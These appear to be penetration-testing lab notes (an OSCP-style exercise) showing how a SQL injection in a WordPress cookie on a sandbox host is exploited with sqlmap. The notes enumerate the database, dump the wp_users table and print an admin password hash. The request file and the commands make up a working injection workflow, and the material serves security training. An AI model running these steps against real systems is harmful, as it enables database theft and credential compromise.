24.2.2.2

# 24.2.2.2.1. Use sqlmap to exploit the SQL injection and extract the username and password.

We will feed a text file into sqlmap. After manually doing the injection, we see from Burpsuite that this is the entire request:
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/24_assemblingThePieces/sandbox$ cat request.txt 
GET / HTTP/1.1
Host: sandbox.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: wp_sap=["1650149780')) OR 1=2 *"];
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

### Enumerate the version
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/24_assemblingThePieces/sandbox$ sqlmap -r request.txt
```
The output tells us the version is `MySQL >= 5.0.12 (MariaDB fork)`
![e90f4ec44724c66c4027170b143b285e.png](06105167d2df42aeac68df02d586146e.png)
![a69ff23a63c298ccc0ee946183a0383a.png](eec0f977db3947d6ba6c4b4112f11c24.png)

### Discover the databases
We see that there are 2 databases: information_schema and wordpress
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/24_assemblingThePieces/sandbox$ sqlmap -r request.txt --dbs
```
![4ef869ee7dadda178694b34094ccd058.png](e0069f3a088f46e0ad635c5c0e0c24ee.png)

### Get the tables from all databases
We see an interesting table named wp_user in the wordpress database
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/24_assemblingThePieces/sandbox$ sqlmap -r request.txt --tables
```
![87f566b8170db6504b615b039c3d513e.png](031ce08f26bd4f86aba971ca6ef9c32d.png)
![c3f2fe756ef13dd44b10bad34c05c879.png](5e99a31b1c92495986c9936bc0ce1006.png)
![2e46a9687d685f5def2763518af2ef28.png](4386af0181a348c18755ace0d5f28c04.png)
![d513edc8f0874b7330bcb5e26f49a785.png](850deb1ca4024750b3049a67d96dadbf.png)

### Get the columns from the wp_user table from the wordpress database
The user_login column looks interesting
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/24_assemblingThePieces/sandbox$ sqlmap -r request.txt --columns -D wordpress -T wp_users
```
![8ed843013c3e72611e82d5907bee81c3.png](89da65eca3114c3591ea9bc95640035a.png)
![96a39f9aef08791f5779bf8ec46eecc7.png](595f574f5286491da7de58b534a75d80.png)

### Dump the contents of the wp_users table from the wordpress database
We get the information for `wp_ajla_admin` password hash is `$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/`
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/24_assemblingThePieces/sandbox$ sqlmap -r request.txt --dump -D wordpress -T wp_users
```
![2d5a8edcc15591a3e1338213bf1cc7e5.png](c2acb994e93e4e18b687a3ddbb4448e8.png)
![b662273106d03c5400f37ffcf5b7e045.png](814f2ee048284812918e56a65404b7a5.png)
